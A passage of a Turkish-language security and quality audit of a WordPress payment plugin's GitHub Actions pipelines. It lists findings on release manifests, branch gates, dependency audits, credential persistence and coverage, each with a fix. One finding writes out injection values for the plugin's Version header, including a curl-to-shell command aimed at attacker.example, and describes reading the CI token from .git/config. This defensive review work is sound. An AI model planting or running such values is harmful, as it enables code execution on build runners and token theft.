Aynı 'release manifest' bilgisi dört yerde elle tekrarlanıyor: (1) build-release.sh:41 `for directory in admin assets includes languages templates`, :50 `for file in API-REFERENCE.md ARCHITECTURE.md ...`, :58 `for file in nicepay-payment-gateway.php readme.txt README.md LICENSE ...`; (2) smoke-check-artifact.sh:15-41'deki 26 satırlık zorunlu yol listesi ve 48-57'deki yasaklı desenler; (3) deploy-wordpress-org.yml:177'deki bağımsız (ve daha dar) yasaklı desen; (4) .gitattributes:21-33'teki export-ignore listesi. Üstelik .gitattributes export-ignore bu release yolunda hiç KULLANILMIYOR (build-release.sh `git archive` değil `cp` kullanıyor, WP.org ise SVN üzerinden gidiyor) — yalnızca Composer dist indirmeleri için etkili, ve orada da `.codacy.yml` export-ignore listesinde eksik.
```

**Başarısızlık senaryosu**

WordPress'in standart `uninstall.php` dosyası eklenip veritabanı temizliği oraya taşınır. build-release.sh:58'deki dosya listesine eklenmediği için ZIP'e girmez. smoke-check-artifact.sh zorunlu listesinde `uninstall.php` olmadığından geçer. `package` job'ı yeşil, release yayımlanır ve eklenti silindiğinde `wp_nicepay_transactions` tablosu ile ödeme kayıtları kalıcı olarak sunucuda kalır — üstelik bunun tam tersi (temizlik yapılacağı) dokümante edilmiştir.

**Etki**

Yeni bir üretim dosyası (ör. `includes/class-nicepay-webhook.php` veya `assets/js/nicepay-vbank.js`) eklendiğinde build-release.sh'ın dizin kopyalaması sayesinde pakete girer ama smoke-check'in zorunlu listesine eklenmezse hiç doğrulanmaz; tersine yeni bir üst düzey dosya (ör. `uninstall.php`) eklenirse build-release.sh'a manuel eklenmediği için PAKETE HİÇ GİRMEZ ve smoke-check bunu fark etmez (yalnızca listedeki 26 yolu arar). Bu, 'eklenti eksik dosyayla yayımlandı' sınıfı bir hatanın CI'dan sessizce geçmesi demektir.

**Öneri**

Tek bir manifest dosyası oluştur (ör. `.github/release-manifest.txt`) ve hem build hem doğrulama onu okusun:
```
admin/
assets/
includes/
languages/
templates/
nicepay-payment-gateway.php
readme.txt
...
```
build-release.sh manifest'i okuyup kopyalasın; smoke-check-artifact.sh aynı manifest'ten beklenen yolları türetsin (dizinler için 'en az bir dosya var' + her üst düzey dosya için tam eşleşme); deploy-wordpress-org.yml inline grep yerine smoke-check'i çağırsın (bkz. CI-008). Ek olarak .gitattributes:21-33'e `/.codacy.yml export-ignore` ekle veya export-ignore'un bu projede etkisiz olduğunu bir yorumla belirt.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Düzeltilmiş iddia: Paket içeriği ("release manifest") dört ayrı yerde elle tekrarlanıyor — build-release.sh:41/50/58 (kopyalama listeleri), smoke-check-artifact.sh:15-41 (26 yolluk zorunlu liste) + :48-57 (yasaklı desenler), deploy-wordpress-org.yml:177 (bağımsız, daha dar yasaklı desen; composer/package/phpunit/eslint/.env/build desenleri burada yok) ve .gitattributes:21-33 (release yolunda hiç kullanılmayan export-ignore listesi; `git archive` repoda mevcut değil, WP.org SVN üzerinden gidiyor; ayrıca tracked olan `.codacy.yml` listede eksik). Drift teorik değil, hâlihazırda mevcut: smoke-check'in zorunlu listesi bugün bile üretim ağacının gerisinde (standalone-payment-form.php, admin/*.php, class-nicepay-offer-resolver.php, class-nicepay-return-handler.php, nicepay-functions.php, nicepay-icons.php, languages/* doğrulanmıyor) ve iki yasaklı-desen listesi birbirinden farklı. Somut başarısızlık: yeni bir ÜST DÜZEY dosya (ör. `uninstall.php`) eklenip build-release.sh:58 listesine yazılmazsa ZIP'e hiç girmez ve smoke-check yalnız kendi 26 yolunu aradığı için yeşil geçer — "eksik dosyayla yayımlanmış eklenti" sessizce release olur. NOT: iddianın "dokümantasyon uninstall'da temizlik yapılacağını söylüyor" kısmı yanlıştır; docs/DEVELOPER-GUIDE.md:58 açıkça "Deactivation and uninstall retain the financial ledger" der ve repoda uninstall.php yoktur — senaryo mekanik olarak geçerli, ama doküman çelişkisi iddiası düşürülmelidir.
- Gerekçe: Çekirdek iddia (aynı "release manifest" bilgisinin dört ayrı yerde elle tekrarlanması + drift riski) kodla birebir doğrulandı; verilen tüm satır numaraları dosyaların şu anki haliyle eşleşiyor ve çürüten bir üst-katman koruma YOK:

1) build-release.sh gerçekten üç ayrı elle yazılmış liste kullanıyor (:41 dizinler, :50 docs, :58 üst düzey dosyalar) ve `cp -R` ile kopyalıyor — repoda hiçbir yerde `git archive` yok (`grep -rn "git archive" .github/` boş), dolayısıyla `.gitattributes:21-33` export-ignore listesi bu release yolunda gerçekten etkisiz. WP.org yolu da zip + SVN (deploy-wordpress-org.yml:287 `svn info ...`).
2) smoke-check-artifact.sh:16-41 tam 26 zorunlu yol içeren bağımsız bir liste; :48-57 bağımsız yasaklı desen listesi.
3) deploy-wordpress-org.yml:177 dördüncü ve DAHA DAR bir inline yasaklı desen (`composer.json`, `package.json`, `phpunit.xml`, `eslint.config.js`, `.env`, `build` smoke-check'te var, burada YOK) — yani iki liste zaten bugün bile birbirinden sapmış durumda; bu, "drift kaçınılmaz" iddiasının teorik değil hâlihazırda gerçekleşmiş olduğunu gösteriyor.
4) `.codacy.yml` repoda mevcut ve git-tracked (`git ls-files | grep codacy` -> `.codacy.yml`), `.gitignore`'da değil ve `.gitattributes` export-ignore listesinde YOK — bu detay da doğru.

Ayrıca iddianın "yeni üretim dosyası smoke-check'te doğrulanmaz" kolu, mevcut kodda zaten görünür durumda: `templates/standalone-payment-form.php`, `admin/class-nicepay-admin.php`, `admin/class-nicepay-transactions.php`, `includes/class-nicepay-offer-resolver.php`, `includes/class-nicepay-return-handler.php`, `includes/nicepay-functions.php`, `includes/nicepay-icons.php` ve `languages/*.mo` dosyalarının HİÇBİRİ smoke-check'in 26 yolluk zorunlu listesinde yok — yani liste bugün bile üretim ağacının gerisinde.

DÜZELTİLMESİ GEREKEN DETAY: "başarısızlık senaryosu"nun son cümlesi ("üstelik bunun tam tersi — temizlik yapılacağı — dokümante edilmiştir") KODA/DOKÜMANA AYKIRI. docs/DEVELOPER-GUIDE.md:58 açıkça tersini söylüyor: "Deactivation and uninstall retain the financial ledger." Ayrıca repoda `uninstall.php` yok ve dokümantasyon veri saklamayı bilinçli tasarım olarak anlatıyor. Senaryonun mekaniği (üst düzey yeni dosya build-release.sh:58 listesine eklenmezse ZIP'e girmez ve smoke-check bunu yakalamaz) doğru; ama seçilen örneğin "dokümantasyonla çelişki" kısmı uydurma. Mekanik doğru olduğu için bulgu ayakta kalıyor, severity medium uygun (yalnız-CI/maintainability etkisi, doğrudan çalışma-zamanı güvenlik/para riski yok).

---

### CI-010 — Tag soyağacı kapısı tag'in 'development' içinde olmasını şart koşuyor, ama CONTRIBUTING 'main'i korumalı release dalı ilan ediyor

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | release-process |
| **Konum** | [.github/workflows/deploy-wordpress-org.yml:85](../../../.github/workflows/deploy-wordpress-org.yml#L85) |
| **Güven** | medium |
| **Doğrulama** | ✅ Doğrulandı (1/1) |

**Sorun ve kanıt**

````yaml
deploy-wordpress-org.yml:85-89:
```bash
git fetch --no-tags origin development:refs/remotes/origin/development
if ! git merge-base --is-ancestor "$head_commit" refs/remotes/origin/development; then
  echo "ERROR: v${VERSION} is not contained in the development branch." >&2
  exit 1
fi
```
Buna karşılık CONTRIBUTING.md:97-104: `main (protected release branch)` / `development (integration branch; normal PR target)` ve '`main` receives only reviewed release promotions'. release.yml:4-6 ise tag'in hangi dalda olduğuna hiç bakmıyor (`on: push: tags: ['v*']`).
````

**Başarısızlık senaryosu**

Bakımcı development'ı main'e PR ile merge eder (merge commit oluşur), ardından `main` üzerinde `v2.1.0` tag'ini atar. GitHub Release başarıyla çıkar (release.yml dal kontrolü yapmaz). Sonra WP.org publish için workflow_dispatch tetiklenir; prepare job'ı 86. satırda `ERROR: v2.1.0 is not contained in the development branch.` ile durur. Bakımcı, doğru ve korumalı bir tag'i yayımlayamaz ve kontrolü kaldırmaya yönelir.

**Etki**

İki dallanma modeli birbiriyle çelişiyor. Eğer release tag'i (CONTRIBUTING'in ima ettiği gibi) `main` üzerinde ve development -> main promosyonu bir merge commit ile yapıldıysa, tag commit'i `development`'ın atası OLMAZ ve WP.org prepare job'ı doğru bir tag'i reddeder. Tersine, tag `development` üzerinde atılıyorsa CONTRIBUTING'deki 'main korumalı release dalıdır' ifadesi yanlıştır ve korumalı dal kontrolü release yolunda hiç devrede değildir. Her iki durumda da 'immutable, gözden geçirilmiş tag' güvencesi belgelenen modelle uyuşmuyor.

**Öneri**

Tek bir release dalı modeli belirle ve kapıyı ona bağla. `main` release dalıysa:
```bash
git fetch --no-tags origin main:refs/remotes/origin/main
if ! git merge-base --is-ancestor "$head_commit" refs/remotes/origin/main; then
  echo "ERROR: v${VERSION} is not contained in the protected main branch." >&2
  exit 1
fi
```
ve aynı kontrolü `release.yml`'ye de ekle (şu anda hiç yok — herhangi bir feature dalından atılan bir tag GitHub Release üretebilir). Ardından CONTRIBUTING.md:97-104 ile dokümantasyonu hizala. Ek olarak tag'in imzalı olmasını (`git verify-tag`) ve annotated olmasını da bu kapıya ekle.

---

### CI-011 — JavaScript bağımlılıkları için hiçbir güvenlik açığı kapısı yok; dependabot yalnızca aylık

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | supply-chain |
| **Konum** | [.github/workflows/tests.yml:95](../../../.github/workflows/tests.yml#L95) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```yaml
tests.yml:95-96 PHP tarafında `composer audit --locked --no-interaction` çalıştırıyor, ancak :98-99'da `npm ci --ignore-scripts`'ten sonra `npm audit` benzeri bir adım YOK. package-lock.json bu PR'da eklenmiş ve 130+ transitive paket içeriyor (eslint, jsdom, css-tree ağaçları). dependabot.yml:6-7, 16-17, 26-27'de üç ekosistem için de `interval: monthly`.
```

**Başarısızlık senaryosu**

Bir eslint plugin veya jsdom transitive bağımlılığında RCE sınıfı bir advisory yayımlanır. `npm ci --ignore-scripts` install script'lerini engeller ama `eslint` çalıştırıldığında kod yine yüklenir. Hiçbir CI adımı uyarmaz; dependabot bir sonraki ayın ilk haftasında PR açar. Arada geçen 3-4 hafta boyunca her CI koşusu savunmasız paketi çalıştırır.

**Etki**

PHP ve JS için asimetrik güvenlik duruşu: bir JS dev bağımlılığında (ör. jsdom/tough-cookie/ws zincirinde) yayımlanan bir advisory, CI'da hiçbir uyarı üretmez ve dependabot en kötü ihtimalle 30 gün sonra fark eder. Bu paketler CI runner'ında repo checkout'u üzerinde çalıştığı için (eslint + node --test), ele geçirilmiş bir dev bağımlılığı build ortamını etkiler.

**Öneri**

tests.yml `lint` job'ına bir adım ekle:
```yaml
      - name: Audit locked JavaScript dependencies
        run: npm audit --audit-level=high --omit=optional
```
ve dependabot.yml'de üç ekosistemin de `interval`'ını `weekly` yap. Ayrıca `package-ecosystem: github-actions` için `interval: weekly` özellikle değerlidir çünkü tüm action'lar SHA-pinned olduğundan güvenlik yaması yalnızca dependabot ile gelir. İsteğe bağlı: `security-updates` ayrı ve daha sık bir grup olarak tanımlanabilir.

---

### CI-012 — Bütün checkout adımları GITHUB_TOKEN'ı çalışma alanında bırakıyor (persist-credentials varsayılan true), SVN secret'larının bulunduğu publish job'ı dahil

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | supply-chain |
| **Konum** | [.github/workflows/deploy-wordpress-org.yml:220](../../../.github/workflows/deploy-wordpress-org.yml#L220) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```yaml
Yedi `actions/checkout` çağrısının hiçbirinde `persist-credentials: false` yok. Varsayılan davranışta token `.git/config` içine `http.https://github.com/.extraheader` olarak yazılır ve sonraki tüm adımlar tarafından okunabilir. deploy-wordpress-org.yml:220'deki checkout, `WPORG_SVN_USERNAME/PASSWORD` secret'larının bulunduğu publish job'ının ilk adımı. Yalnızca deploy-wordpress-org.yml:59'daki checkout gerçekten kimlik bilgisine ihtiyaç duyuyor (85. satırdaki `git fetch` nedeniyle).
```

**Başarısızlık senaryosu**

release.yml'nin `release` job'ında `setup-php` sonrası çalışan herhangi bir adım (veya bu adımların indirdiği bir araç) `.git/config`'ten extraheader'ı okur ve `contents: write` yetkili token ile depoya sahte bir release asset'i yükler. Yayımlanan `.sha256` ile ZIP tutarlı görünür ama içerik değiştirilmiştir.

**Etki**

Ele geçirilmiş bir npm/composer dev bağımlılığı veya bir action, `cat .git/config` ile GITHUB_TOKEN'ı okuyabilir. tests.yml'de token `contents: read` olduğu için etki sınırlı; ancak release.yml'de token `contents: write` (satır 21) — yani release oluşturma/asset yükleme yetkisi bir yan adımdan sızabilir. Derinlemesine savunma açısından gereksiz bir maruziyet.

**Öneri**

Kimlik bilgisine ihtiyaç duymayan tüm checkout'lara ekle:
```yaml
        with:
          persist-credentials: false
```
Yalnızca deploy-wordpress-org.yml:59'daki checkout'ta (git fetch nedeniyle) bırak veya orada da `fetch-depth: 0` yerine açık `token:` kullan. tests.yml:29/80/119/130/142, release.yml:25 ve deploy-wordpress-org.yml:220 için bu değişiklik davranışı bozmaz.

---

### CI-013 — tests.yml 'package' job'unda plugin header'dan okunan sürüm doğrudan 'run:' bloğuna enterpole ediliyor (script injection kalıbı)

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | workflow-security |
| **Konum** | [.github/workflows/tests.yml:157](../../../.github/workflows/tests.yml#L157) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````yaml
tests.yml:150-157:
```yaml
      - name: Resolve plugin version
        id: version
        run: |
          version="$(node -e "...match(/^\\s*\\*\\s*Version:\\s*([^\\s]+)/m)...")"
          echo "version=$version" >> "$GITHUB_OUTPUT"
      - name: Build plugin artifact
        run: bash .github/scripts/build-release.sh "${{ steps.version.outputs.version }}" build/nicepay-payment-gateway.zip
```
157. satırda depo içeriğinden türeyen bir değer, kabuk komutuna doğrudan `${{ }}` ile gömülüyor. Regex `[^\s]+` boşluk dışında her karakteri (tırnak, `;`, `$(`, backtick) kabul ediyor. Karşılaştırma için release.yml:35-40 aynı işi DOĞRU şekilde yapıyor: `env: RELEASE_TAG: ${{ github.ref_name }}` + `version="${RELEASE_TAG#v}"`.
````

**Başarısızlık senaryosu**

Bir katkıda bulunan fork'unda plugin header'ının Version satırını `2.0.0";echo${IFS}pwned;"` yapar ve PR açar. tests.yml `push`/`pull_request` ile tetiklenir; `Resolve plugin version` adımı bu değeri GITHUB_OUTPUT'a yazar; 157. satırdaki enterpolasyon sonrası kabuk `bash .github/scripts/build-release.sh "2.0.0";echo pwned;"" build/...` komutunu çalıştırır. (Not: `check-version.js`'in semver kontrolü build-release.sh:23'te YAPILDIĞI için, enjeksiyon zaten o kontrole ulaşmadan kabukta gerçekleşir.)

**Etki**

Fork'tan gelen bir PR, nicepay-payment-gateway.php'nin Version header'ını `2.0.0";curl${IFS}attacker.example|sh;"` gibi bir değere çevirerek `package` job'ında keyfi komut çalıştırabilir. Token `contents: read` ve secret yok, dolayısıyla doğrudan hırsızlık düşük; ancak runner üzerinde kod çalıştırma, composer/npm cache'ini zehirleme ve gelecekte bu job'a eklenecek herhangi bir yetki/secret için hazır bir zafiyet anlamına gelir. Ayrıca aynı repoda doğru kalıbın (release.yml) kullanılıyor olması bunu bir tutarsızlık haline getiriyor.

**Öneri**

release.yml kalıbını uygula ve değeri env üzerinden geçir; ayrıca output'u yazmadan önce doğrula:
```yaml
      - name: Resolve plugin version
        id: version
        run: |
          version="$(sed -nE 's/^[[:space:]]*\*[[:space:]]*Version:[[:space:]]*([^[:space:]]+).*/\1/p' nicepay-payment-gateway.php | head -n 1)"
          [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]] || { echo "ERROR: unsupported version header: $version" >&2; exit 1; }
          echo "version=$version" >> "$GITHUB_OUTPUT"

      - name: Build plugin artifact
        env:
          VERSION: ${{ steps.version.outputs.version }}
        run: bash .github/scripts/build-release.sh "$VERSION" build/nicepay-payment-gateway.zip
```

---

### CI-014 — check-po-placeholders.js'deki 'Virtual Account' kapısı sabit bir İngilizce msgid'e bağlı — kaynak metin değişirse kapı sessizce devre dışı kalır

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | quality-gate |
| **Konum** | [.github/scripts/check-po-placeholders.js:132](../../../.github/scripts/check-po-placeholders.js#L132) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````javascript
check-po-placeholders.js:132-138:
```js
if (entry.msgid === 'Pay securely via NicePay (Credit Card, Bank Transfer, or Mobile).') {
    const translation = entry.msgstr || '';
    if (/virtual account|sanal hesap|가상계좌|虚拟账户/iu.test(translation)) {
        process.stderr.write(`${file}:${entry.line}: unsupported Virtual Account claim remains...`);
        failures += 1;
    }
}
```
Eşleşme tam string karşılaştırmasıdır ve msgid bulunamadığında hiçbir uyarı üretilmez — kapı 'sessizce hiçbir şey yapmaz' moduna düşer.
````

**Başarısızlık senaryosu**

Metin düzenlemesi sırasında msgid tek karakter değişir (ör. 'NicePay' -> 'NICEPAY'). Bir çevirmen ko_KR kataloğuna '가상계좌' içeren bir açıklama yazar. check-po-placeholders.js hiçbir entry ile eşleşmediği için 'PO placeholder, HTML, and certified-feature checks passed.' basar ve CI yeşil geçer. Korece kullanıcılar checkout'ta desteklenmeyen sanal hesap seçeneği vaat eden bir açıklama görür.

**Etki**

Gateway açıklaması bir gün 'Pay securely via NICEPAY (Card, Bank Transfer, or Mobile).' olarak düzenlenirse (ki markanın 'NICEPAY' büyük harfle yazımı zaten dokümantasyonda kullanılıyor), desteklenmeyen Sanal Hesap iddiasına karşı koruyan tek otomatik kontrol sessizce kaybolur. readme.txt:23 ve :69'da açıkça 'Virtual accounts ... are not supported' denildiği için bu, kullanıcıya yanlış özellik vaadi anlamına gelir — ödeme ürününde bu bir uyum/iade riski.

**Öneri**

Kapıyı msgid'e değil, katalogun tamamına uygula ve beklenen msgid'in varlığını da doğrula:
```js
const gatewayDescriptionPattern = /^Pay securely via NicePay\b/i;
let gatewayDescriptionSeen = false;
// entry döngüsünde:
if (gatewayDescriptionPattern.test(entry.msgid)) {
    gatewayDescriptionSeen = true;
    ...
}
// döngü sonunda:
if (!gatewayDescriptionSeen) {
    process.stderr.write(`${file}: gateway description entry not found; the Virtual Account gate is no longer enforced\n`);
    failures += 1;
}
```
Aynı prensip check-js.js:21 ve check-css.js:16'daki allowlist kontrollerinde zaten doğru uygulanmış (liste bayatlarsa hata veriyor) — bu kapıyı da o kalıba getir.

---

### CI-015 — Kabuk script'leri için shellcheck/format kapısı yok; release-kritik script'lerde tab/space karışımı .editorconfig'i ihlal ediyor

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | quality-gate |
| **Konum** | [.github/scripts/smoke-check-artifact.sh:21](../../../.github/scripts/smoke-check-artifact.sh#L21) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```bash
smoke-check-artifact.sh:21 ve :30 sekme (tab) ile girintilenmiş, aynı listedeki diğer 24 satır ise 4 boşlukla — dosya içinde karışık. check-translations.sh:9-10, 31-38 tamamen tab; run-woocommerce-smoke.sh 50 satırda tab kullanırken kardeşi run-schema-migration.sh'da 0 tab var. .editorconfig:7-8 ise `indent_style = space` / `indent_size = 4` diyor. `grep -rn shellcheck .github composer.json package.json` hiçbir sonuç vermiyor; tests.yml:104-111'deki quality adımları yalnızca JS (eslint) ve PHP (php -l) kapsıyor.
```

**Başarısızlık senaryosu**

Yeni bir bakımcı build-release.sh'a `cp -R $repository_root/$directory $package_root/` gibi tırnaksız bir satır ekler. Yerel geliştirmede yol boşluk içermediği için çalışır; CI'da `/home/runner/work/...` yolunda da çalışır. Ancak bir gün organizasyon adı değişip yol boşluk içerdiğinde veya bir katkıda bulunanın makinesinde (`/Users/ad soyad/...`) build sessizce eksik dosyalarla tamamlanır ve smoke-check'in listelemediği bir dosya pakete girmez.

**Etki**

Altı adet release-kritik bash script'i (build-release, smoke-check, check-translations, lint-php ve iki entegrasyon koşucusu) hiçbir statik analizden geçmiyor. ShellCheck'in rutin yakaladığı hatalar (tırnaklanmamış genişletme, `[[ ]]` içinde yanlış operatör, `set -e` ile maskelenen dönüş kodları, kullanılmayan değişken) yalnızca çalışma zamanında görülebilir. Ayrıca .editorconfig repoda var ama hiçbir CI adımı onu doğrulamadığı için biçim tutarsızlığı serbestçe birikiyor.

**Öneri**

tests.yml `lint` job'ına ekle (ubuntu-latest'te shellcheck kurulu gelir):
```yaml
      - name: Lint shell scripts
        run: shellcheck --severity=warning .github/scripts/*.sh tests/integration/*.sh
```
ve girinti tutarsızlığını düzeltmek için `editorconfig-checker` ekle:
```yaml
      - name: Verify editor configuration compliance
        run: npx --yes editorconfig-checker
```
Önce smoke-check-artifact.sh:21,30 ve check-translations.sh / run-woocommerce-smoke.sh dosyalarındaki sekmeleri 4 boşluğa çevir.

---

### CI-016 — phpunit.xml coverage kapsamı yalnızca 'includes/'; admin/ ve bootstrap dosyası hariç ve hiçbir eşik zorunlu değil

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | test-coverage |
| **Konum** | [phpunit.xml:22](../../../phpunit.xml#L22) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````
phpunit.xml:22-30:
```xml
    <coverage processUncoveredFiles="false">
        <include>
            <directory suffix=".php">includes</directory>
        </include>
```
`admin/` dizini (class-nicepay-admin.php ~1199 satır + class-nicepay-transactions.php ~1030 satır) ve kök `nicepay-payment-gateway.php` (~827 satır) kapsam ölçümünün DIŞINDA — oysa NicePayAdminOperationsTest ve NicePayTransactionsAdminTest bu kodu test ediyor. tests.yml:61-72 coverage'ı üretip artifact olarak yüklüyor ama hiçbir minimum eşik (`--coverage-text --coverage-clover` + threshold, veya `<report>` içinde `lowUpperBound`) zorunlu değil ve hiçbir job coverage düşüşünde başarısız olmuyor.
````

**Başarısızlık senaryosu**

Bir refactor `admin/class-nicepay-transactions.php`'deki iade akışını (`ajax_cancel_transaction`) kırar ve ilgili testler yanlışlıkla silinir/skip edilir. Coverage raporu bu dosyayı zaten hiç ölçmediği için yüzde değişmez, hiçbir eşik ihlali oluşmaz, CI yeşil geçer ve iade akışındaki regresyon üretime gider.

**Etki**

Üretilen coverage raporu iki yönden yanıltıcı: (a) ~3.000 satırlık admin ve bootstrap kodu paydada yer almadığı için yüzde olduğundan yüksek görünür; (b) hiçbir eşik olmadığı için coverage sıfıra düşse bile CI yeşil kalır. Coverage artifact'i 5 gün saklanıp kimse bakmazsa fiilen ölü bir CI adımıdır (matrix.php == '8.2' ayağında xdebug ile ek süre maliyeti de var).

**Öneri**

Kapsamı gerçek üretim yüzeyine genişlet ve bir eşik uygula:
```xml
    <coverage processUncoveredFiles="false">
        <include>
            <directory suffix=".php">includes</directory>
            <directory suffix=".php">admin</directory>
            <file>nicepay-payment-gateway.php</file>
        </include>
        <exclude>
            <directory>vendor</directory>
            <directory>tests</directory>
        </exclude>
    </coverage>
```
ve composer.json'a eşik zorunlu bir script ekleyip tests.yml'de çalıştır:
```json
"test-coverage-check": "phpunit --configuration phpunit.xml --coverage-text --coverage-clover tests/coverage/clover.xml && php .github/scripts/check-coverage.php 70"
```

---

### CI-017 — Prerelease tespiti yalnızca -beta/-rc/-alpha alt dizgelerine bakıyor; check-version.js'in kabul ettiği diğer prerelease tag'leri tam release olarak yayımlanır

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | release-metadata |
| **Konum** | [.github/workflows/release.yml:78](../../../.github/workflows/release.yml#L78) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````yaml
release.yml:78:
```yaml
          prerelease: ${{ contains(github.ref_name, '-beta') || contains(github.ref_name, '-rc') || contains(github.ref_name, '-alpha') }}
```
Buna karşılık check-version.js:63'teki semver regex çok daha geniş: `/^\d+\.\d+\.\d+(?:-[0-9A-Za-z]+(?:[.-][0-9A-Za-z]+)*)?$/` — yani `2.1.0-dev1`, `2.1.0-preview`, `2.1.0-pre.3`, `2.1.0-canary` gibi tag'ler geçerli sayılır ama prerelease olarak İŞARETLENMEZ (`draft: false` da satır 77'de sabit).
````

**Başarısızlık senaryosu**

Bakımcı bir müşteriye doğrulatmak için `v2.1.0-dev1` tag'i atar. release.yml tetiklenir, `contains(ref_name,'-beta'|'-rc'|'-alpha')` üçü de false döner, release `prerelease: false` ve `draft: false` ile yayımlanır ve 'Latest' olarak işaretlenir. Üçüncü taraf bir mağaza sahibi bu ZIP'i indirip canlı ödeme ortamına kurar.

**Etki**

`v2.1.0-dev1` gibi bir tag, GitHub Releases'te 'Latest release' rozetiyle tam sürüm olarak görünür. README.md:39'da kullanıcılara 'en son ZIP'i indirin' denildiği için üretim mağazaları bir geliştirme yapısını kurabilir. Ayrıca `Update URI` üzerinden GitHub güncelleme kanalı kullanan kurulumlar bu sürümü otomatik güncelleme adayı olarak görebilir.

**Öneri**

Tek doğruluk kaynağı olarak semver prerelease bölümünün varlığına bak:
```yaml
          prerelease: ${{ contains(github.ref_name, '-') }}
```
veya daha açık şekilde 'Extract and validate tag version' adımında bir output üret:
```bash
if [[ "$version" == *-* ]]; then echo 'prerelease=true' >> "$GITHUB_OUTPUT"; else echo 'prerelease=false' >> "$GITHUB_OUTPUT"; fi
```
ve `prerelease: ${{ steps.version.outputs.prerelease }}` kullan.

---

### CI-018 — WordPress.org publish işi var olmayan bir '.wordpress-org' asset dizinini işaret ediyor; ilk yayın ikonsuz/bannersız listeleme veya deploy hatasıyla sonuçlanabilir

| | |
|---|---|
| **Severity** | 🔵 Düşük |
| **Kategori** | release-process |
| **Konum** | [.github/workflows/deploy-wordpress-org.yml:298](../../../.github/workflows/deploy-wordpress-org.yml#L298) |
| **Güven** | medium |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

```yaml
deploy-wordpress-org.yml:297-303'te `env: ASSETS_DIR: .wordpress-org` tanımlı, ancak repoda böyle bir dizin yok (`ls .wordpress-org` -> 'No such file or directory'; `git ls-files | grep wordpress-org` yalnızca workflow ve doküman dosyasını döndürüyor). docs/WORDPRESS-ORG-RELEASE.md:92-103 bunu bilinçli olarak açıklıyor ('hazır ve hakları doğrulanmış görsel olmadığı için ... eklenmemiştir') ama workflow bu durumu ele alan bir koşul içermiyor. Ayrıca readme.txt'de `Contributors:` başlığı hiç yok (satır 1-11) — publish job'ı 262-265'te bunu doğru şekilde bloke ediyor, dolayısıyla ilk yayın zaten bu kapıda duracak.
```

**Başarısızlık senaryosu**

Slug onayı alınır, Contributors eklenir, publish tetiklenir. `Publish verified payload` adımında 10up action `$GITHUB_WORKSPACE/.wordpress-org` dizinini bulamaz. En iyi durumda uyarı basıp devam eder ve wordpress.org/plugins/<slug> sayfası varsayılan gri ikonla, bannersız ve ekran görüntüsüz yayınlanır; en kötü durumda rsync hatasıyla job yarıda kalır ve SVN trunk yarım commit'lenmiş olabilir.

**Etki**

İlk publish denemesinde 10up action'ın asset senkronizasyon adımı, var olmayan dizin nedeniyle ya hata verir ya da (sürüme bağlı olarak) sessizce atlar. İkinci durumda WordPress.org listelemesi ikon, banner ve ekran görüntüsü olmadan yayına girer; bir ödeme eklentisi için bu, kullanıcı güveni açısından zayıf bir ilk izlenimdir ve WP.org asset'leri sonradan ayrı bir SVN /assets commit'i gerektirir (dokümanın 196. satırı bu workflow'un readme/asset güncellemesi için kullanılmamasını söylüyor — yani düzeltmenin yolu da tanımlı değil).

**Öneri**

Publish öncesi doğrulama adımına (deploy-wordpress-org.yml:238 civarı) açık bir kapı ekle ve niyeti kodda görünür kıl:
```bash
if [[ ! -d "$GITHUB_WORKSPACE/.wordpress-org" ]]; then
  echo '::warning::No .wordpress-org assets directory; the directory listing will publish without icon, banner, or screenshots.'
  if [[ "${REQUIRE_WPORG_ASSETS:-1}" == '1' ]]; then
    echo 'ERROR: add .wordpress-org assets or set REQUIRE_WPORG_ASSETS=0 to publish without them.' >&2
    exit 1
  fi
fi
```
Ayrıca docs/WORDPRESS-ORG-RELEASE.md:172-191'deki kontrol listesine 'ikon ve banner dosyaları .wordpress-org/ altına eklendi' maddesini ekle ve `readme.txt`'ye eksik `Contributors:` satırını (publish kapısının beklediği biçimde) yer tutucu olmadan, onay sonrası doldurulacak şekilde dokümante et.

---

### CI-019 — development dalına yapılan her push'ta test workflow'u iki kez çalışıyor (push + pull_request), concurrency bunu birleştirmiyor

| | |
|---|---|
| **Severity** | ⚪ Bilgi |
| **Kategori** | ci-efficiency |
| **Konum** | [.github/workflows/tests.yml:5](../../../.github/workflows/tests.yml#L5) |
| **Güven** | high |
| **Doğrulama** | — Doğrulanmadı |

**Sorun ve kanıt**

````yaml
tests.yml:5-8:
```yaml
  pull_request:
    branches: [main, development]
  push:
    branches: [main, development]
```
ve 13-15:
```yaml
concurrency:
  group: tests-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```
PR açık bir dal için `github.ref` push'ta `refs/heads/development`, pull_request'te `refs/pull/N/merge` olduğundan iki farklı concurrency grubu oluşur ve iki tam koşu paralel çalışır.
````

**Başarısızlık senaryosu**

development dalında açık bir PR varken 5 ardışık commit push edilir. 10 tam pipeline koşusu tetiklenir; bunların 5'i (push tetiklemeli olanlar) hiçbir ek bilgi üretmez. Docker Hub anonim pull limiti (6 saatte 100) dolar ve entegrasyon job'ları 'toomanyrequests' ile kırılmaya başlar — üstelik gerçek bir kod sorunu yoktur.

**Etki**

